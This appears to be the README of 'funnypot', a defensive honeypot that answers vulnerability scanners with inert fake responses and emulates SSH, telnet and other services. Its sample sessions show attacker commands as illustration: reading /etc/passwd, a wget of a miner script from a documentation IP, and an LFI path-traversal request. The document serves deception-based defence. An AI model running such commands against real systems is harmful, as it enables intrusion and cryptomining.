# funnypot-app 🍯

[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![PHP](https://img.shields.io/badge/php-%3E%3D8.0-777bb3.svg)](composer.json)
[![Engine](https://img.shields.io/badge/engine-funnypot--core-blue.svg)](https://github.com/metrictower/funnypot-core)

**A honeypot that answers a scanner's probe with the fake-vulnerable response it was fishing for.**

funnypot is the opposite of a [nuclei](https://github.com/projectdiscovery/nuclei) scanner. A scanner
sends a probe and reads the reply to decide "this host is vulnerable". funnypot reads the incoming probe
and writes back the reply that the scanner's own matcher is looking for. The scanner leaves with a full,
believable, completely wrong vulnerability report, and you log every move it made.

This repo is the **standalone honeypot app**: a Docker image that stands the whole thing up on your own
box. It runs the HTTP deception engine across the common web ports and adds 18 TCP service honeypots
(a real pure-PHP SSH server, a telnet fake shell, redis, ftp, smtp, mysql, postgres, mongodb, modbus and
more). It ships with a live dashboard and an admin panel to switch each fake on or off.

The HTTP engine itself is a separate Composer package, [`metrictower/funnypot-core`](https://github.com/metrictower/funnypot-core).
Use that if you want to drop the inversion engine into your own Laravel or PSR-15 app instead of running
the box. This app depends on it.

> Defensive deception for infrastructure you own. Every fake is inert: `example.com` hosts, RFC-5737
> documentation IPs, obviously-fake secrets. Never a real or working credential.

---

## Dashboard

Every hit streams onto a live dashboard: HTTP probes, and SSH, telnet, redis and other connections, with
top talkers, which templates fired, hourly activity and a GeoIP attacker map. One-click quick-filters slice
the stream by category — SSH/telnet commands, credential attempts, spider-trap hits, and **fake-admin-panel
navigation** (`event=panel`) — and a free-text path search drills into any section (`/admin/bank`, …).

![funnypot dashboard](docs/img/dashboard.png)

The admin panel is the **emulation catalog**: one toggle per capability, so you decide exactly which
CVEs, attack classes and services this box pretends to be.

![emulation catalog toggles](docs/img/emulations.png)

---

## Quick start (Docker)

The [`demo/`](demo/) directory is a complete front controller: a welcome homepage and live dashboard at
`/`, with every other request run through the engine and logged. The image runs nginx and php-fpm across
the web ports and launches all 18 TCP listeners.

```bash
# compose
cd demo && docker compose up --build

# or plain docker
docker build -f demo/Dockerfile -t funnypot . && docker run --rm \
  -p 80:80 -p 443:443 -p 8080:8080 -p 2222:2222 funnypot
```

Open <http://localhost:8080> for the dashboard, then act like an attacker: point a scanner, curl, or an
`ssh` or `telnet` client at it and watch the hits land. Deployment helpers live in
[`scripts/deploy.sh`](scripts/deploy.sh); more detail in [`demo/README.md`](demo/README.md).

> Point it only at your own infrastructure, and expose it on ports you control. It is a decoy for
> scanners, not a service.

---

## What an attacker sees

**An SSH session.** The pure-PHP SSH server runs the real crypto handshake, accepts any password, and
drops into a fake shell. Every command is logged. None is ever run:

```console
$ ssh -p 2222 root@honeypot.example
root@honeypot.example's password:              # any password is accepted
Last login: Mon Aug 18 09:14:02 2026 from 10.0.0.1
root@web01:~# whoami
root
root@web01:~# uname -a
Linux web01 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
root@web01:~# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
root@web01:~# wget http://203.0.113.9/miner.sh     # URL logged as intel, the file is NEVER fetched
--2026-08-18 09:14:31--  http://203.0.113.9/miner.sh
Resolving 203.0.113.9... 93.184.216.34
Connecting to 203.0.113.9|93.184.216.34|:80... connected.
HTTP request sent, awaiting response... 200 OK
root@web01:~# exit
logout
```

**A web scanner or curl.** A probe for an exposed git repo and an LFI attempt, both answered with an
inert fake. No file is ever read:

```console
$ curl -s http://honeypot.example/.git/config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://git.example.com/internal/platform.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main

$ curl -s 'http://honeypot.example/index.php?page=../../../../etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
```

Run a whole scan against it and dozens of "findings" light up on the dashboard:
`nuclei -u http://localhost:8080 -t http/exposures/`.

---

## What it emulates

| Capability | What it does |
|---|---|
| **Nuclei inversion** | About 6,300 templates compiled into route personas; a scanner's own matcher is satisfied by an inert fake. |
| **Attack-class emulators** (31) | Reflect LFI, SQLi, command injection, SSTI, XXE, shellshock, Struts OGNL, open redirect, reflected XSS and IMDS on any path, with canned inert markers (`root:x:0:0…`, `uid=0(root)…`). |
| **Product and route decoys** (26) | Believable `.git/config`, `.env`, `xmlrpc`, `wp-config`, `phpinfo`, `.htpasswd`, `server-status`, `package.json`, SSH keys, SQL dumps, phpMyAdmin, Tomcat manager and more. Data-bearing decoys are filled by shared seeded generators, so people and records are coherent per deployment, not repeated `jdoe`/`example.com` rows. |
| **LLM fake pages** (long-tail fallback) | On a template / CRS / nuclei miss, a probe-gated model fills a small JSON slot-set that a trusted PHP shell renders into a full styled page — WordPress, phpMyAdmin, Grafana, AdminLTE or a generic admin look — with seeded, coherent fake people and records. It only ever *upgrades* a plain 404; the HTTP status and content-type stay app-chosen, and every value is escaped by construction. |
| **Pure-PHP SSH-2.0 server** | Real curve25519-sha256 key exchange, ed25519 host key, aes256-ctr and hmac-sha2-256 transport. No libssh, no OpenSSH. Accept-all auth drops the attacker into a fake shell with decoy files. |
| **TCP protocol emulators** (18) | ssh, telnet, redis, ftp, smtp, memcached, pop3, imap, finger, vnc, rsync, clamav, zookeeper, mysql, postgres, mongodb, modbus, ethernet-ip. Every command logged, nothing run. |
| **Emulation catalog** | Auto-registering list of every capability; a sparse JSON file, or the dashboard, toggles each on or off. |
| **Anti-fingerprint** | One coherent product persona per attacker (deterministic, spoof-proof seed) instead of an impossible "vulnerable to everything" host. Per-host self-signed certs, consistent `X-Powered-By`, a tamper-evident honeytoken cookie. |

The attack, decoy and nuclei-corpus capabilities all come from the [`funnypot-core`](https://github.com/metrictower/funnypot-core)
engine. The SSH server, the TCP protocol emulators and the dashboard live in this repo.

---

## The deep admin panel

On an admin-shaped path (`/admin`, `/panel/…`, `/dashboard`, `/manage`, `/console`, `/cp`, `/wp-admin`,
`/phpmyadmin`, `/grafana`, …) the LLM tier serves a **deep, explorable fake corporate office panel** — the
marquee lure, built for *hours* of exploration. It renders **deterministically from a seeded skin, with no
model call**, so it is always available (never blocked on the sidecar) and byte-identical per deploy. A
dev-style **debug-mode banner** ("bound to `0.0.0.0`, auth off") rides every page to explain — in-narrative
— why an admin panel is publicly reachable at all, so the exposure reads as a misconfiguration, not a trap.

**What's in it.** A "control-everything" building + business dashboard, roughly 26 modules behind a grouped
sidebar: HR (org chart, directory, payroll), Finance (AP/invoices), **Bank & Treasury**, HVAC, CCTV,
lighting/blinds, access control, fire & life-safety, environment sensors, energy/metering, IT assets
(CMDB), IT services (helpdesk, printers, licences), network/VPN/VoIP, facilities (floorplan, rooms, work
orders), appliances/AV/elevators, plus a global search and activity feed. Every screen is deep — lists
paginate, entities have detail pages and sub-tabs, controls have leaves.

**The bank greed-lure** (`/admin/bank`) is the top-tier time-sink: a wire flow that passes a fake SMS-2FA,
shows "submitted", then reads as **reversed for compliance** in the ledger; an approver 2FA-"bypass"
illusion that still needs a second approver; corporate cards with **Luhn-valid** PANs on sandbox BINs;
an ETH **"cold wallet" reserve** showing a few *real, on-chain-verifiable* addresses (the hook — real
balances an attacker can confirm but never spend) surrounded by **masked fake** addresses/tx-hashes; a
downloadable `wallet.json` keystore whose key material is nonsense; and an ETH **staking** view whose
unstake always fails and whose rewards feed shows live "Nh ago" ages.

**Invariants.** Everything is **100% inert** — no real SMS/transfer/broadcast/exec, no external call on the
request path, nothing persists; the scary money/control verbs never return "done", they land on a guarded
soft-deny or a complete-then-reverse. Every page is a **pure function of the deploy seed + URL** (a reload
is byte-identical), **escape-by-construction**, and **fingerprint-safe**. Panels are **exempt from the
per-IP velocity/bulk-scan gate** so a human can explore freely without self-pinning to 404s (renders are
cheap + cached). The one exception to "cached/frozen" is the staking rewards feed, which renders a live
relative age and is deliberately cache-exempt. Data is seeded + coherent (one persona/company per deploy),
arithmetic reconciles (cash-on-hand = Σ balances, ledgers, payroll), and cross-module facts agree — kept
honest by an ongoing realism-hardening pass so the fakery holds up under an attacker's scrutiny.

Architecture: `PanelRoute` (a positional path parser) + `PanelRegistry` (one class per module) + the
`AdminLteSkin` chrome + ~26 seeded `Fake\*` generators, all under `src/App/Render/`.

---

## Response styles

Set with the `FUNNYPOT_STYLE` environment variable (the demo defaults to `realistic`):

| Style | What the attacker gets |
|---|---|
| `minimal` | Just the tokens the matcher needs. Smallest. |
| `realistic` | A believable fake: a full `.git/config`, a plausible `.env`, a real XML-RPC `methodResponse`. All values inert. |
| `taunt` | Still satisfies the scanner (time still wasted) and adds a visible "honeypot, your scan was logged" marker. |

Fuller content is checked against the matcher before use. If a fuller body would not satisfy the scanner
it falls back to minimal, so the extra detail can never break the guarantee.

## The emulation catalog

Every capability funnypot can emulate (attack classes, product decoys, protocol services, the nuclei
corpus) is listed in a derived, auto-registering catalog. You control it through a sparse JSON file
(`funnypot-vulns.json`) or the dashboard's toggle panel. Only changes from a capability's default need to
be recorded, so a newly-added template shows up on its own at its declared default:

```json
{ "version": 1, "vulns": { "attack-cmdi-unix": false, "service-telnet": false, "nuclei-reflection": true } }
```

A disabled service does not bind, a disabled attack rule is skipped, and `nuclei-reflection` off drops all
nuclei-derived fakes. See [`docs/EMULATION-CATALOG.md`](docs/EMULATION-CATALOG.md).

## Safety and invariants

funnypot is built so it can only ever mislead an attacker, never help one.

- **Emulate output, never run input.** The fake shell is a lookup table: no `exec`, `proc_open` or
  `eval`, no real filesystem, no outbound socket. `wget` and `curl` return canned text and the URL is
  logged, never fetched.
- **Reflect, never harm.** No decompression bombs (decoy archives are a few KB), no retaliation, no
  outbound requests. Every response is size-capped.
- **Never reflects attacker input**, never deserializes a request body. Every synthesized header is
  CRLF and NUL safe.
- **Coherent personas.** One believable host per attacker, deterministically seeded, not an impossible
  "vulnerable to everything" fingerprint a real analyst would spot.
- **The LLM only upgrades a 404.** The optional page-realism model can only turn a plain 404 into a richer
  believable page; any model fault degrades back to that 404, never to a 500 (a 500 is itself a tell). It
  never chooses the HTTP status or content-type.
- **Inert fakes only.** `example.com` hosts, RFC-5737 IPs, obviously-fake keys and hashes. Never a real
  or working secret.

## Use the engine in your own app

If you want the HTTP inversion engine inside an existing app rather than a whole honeypot box, use the
Composer package instead of this repo:

```bash
composer require metrictower/funnypot-core
```

It is inert by default (detect-only, gate closed), with an opt-in respond mode and a Laravel drop-in. See
the [funnypot-core README](https://github.com/metrictower/funnypot-core) for the integration guide.

## Testing

```bash
composer install
vendor/bin/phpunit          # app suite: SSH handshake/transport, protocol emulators, the catalog
```

The engine has its own test suite in the [`funnypot-core`](https://github.com/metrictower/funnypot-core) repo,
including a golden test that runs real nuclei against a live server.

## Build-time helpers

The compiled artifacts under `resources/compiled/` are committed, so a normal run needs no build step.
To regenerate them after editing templates:

```bash
bin/funnypot compile-protocols     # templates/protocol -> the TCP emulator table
bin/funnypot compile-catalog       # derive the emulation catalog (app + engine templates)
bin/funnypot vulns:sync            # refresh the on/off toggle list
```

## Docs

- [`demo/README.md`](demo/README.md): running the standalone honeypot.
- [`docs/EMULATION-CATALOG.md`](docs/EMULATION-CATALOG.md): the configurable capability surface.
- [`docs/PROTOCOL-HONEYPOT-PLAN.md`](docs/PROTOCOL-HONEYPOT-PLAN.md): the TCP service emulators and SSH server.
- [funnypot-core](https://github.com/metrictower/funnypot-core): the HTTP inversion engine, its spec and its integration guide.

## Licence

MIT. See [LICENSE](LICENSE). The nuclei inversion engine is derived in part from
[projectdiscovery/nuclei-templates](https://github.com/projectdiscovery/nuclei-templates)
(MIT, © 2025 ProjectDiscovery, Inc.); the upstream notice ships with the
[funnypot-core](https://github.com/metrictower/funnypot-core) engine.
